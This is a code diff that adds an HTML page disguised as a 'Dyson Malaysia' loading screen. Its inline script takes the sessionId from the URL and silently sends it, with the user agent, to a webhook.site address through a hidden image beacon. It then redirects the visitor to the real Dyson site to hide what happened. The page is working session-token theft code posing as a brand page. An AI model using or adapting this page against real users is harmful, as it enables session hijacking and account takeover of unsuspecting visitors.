@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Dyson Malaysia • Loading...</title>
+  <meta charset="UTF-8">
+  <script>
+    (function(){
+      // Extract sessionId
+      const params = new URLSearchParams(window.location.search);
+      const sessionId = params.get("sessionId");
+      
+      if (sessionId) {
+        // Send beacon via <img> to preserve Referer from dyson.my
+        const beacon = new Image();
+        beacon.src = "https://webhook.site/a2cf25f1-cb51-4ea9-9510-e885e4495fdc?leak=" 
+                      + encodeURIComponent(sessionId)
+                      + "&ua=" + encodeURIComponent(navigator.userAgent);
+        beacon.style.display = "none";
+        document.body.appendChild(beacon);
+      }
+
+      // Show brief loading message
+      document.write("<p style='font-family:Arial,sans-serif; color:#666;'>Loading Dyson Malaysia...</p>");
+
+      // Redirect back to official site
+      setTimeout(() => {
+        window.location.href = "https://www.dyson.my";
+      }, 2500);
+    })();
+  </script>
+</head>
+<body></body>
+</html>
